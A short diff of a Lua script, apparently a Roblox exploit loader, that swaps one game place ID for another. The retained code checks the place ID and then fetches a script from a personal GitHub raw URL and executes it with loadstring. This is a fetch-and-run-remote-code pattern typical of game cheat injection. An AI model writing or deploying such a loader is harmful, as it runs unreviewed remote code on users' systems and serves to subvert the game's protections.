@@ -1,5 +1,5 @@
 
-local ID = 4241242833
+local ID = 4375619868
 
 if game.PlaceId == ID then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Sugar14Daddy/xyz/main/--kh", true))()
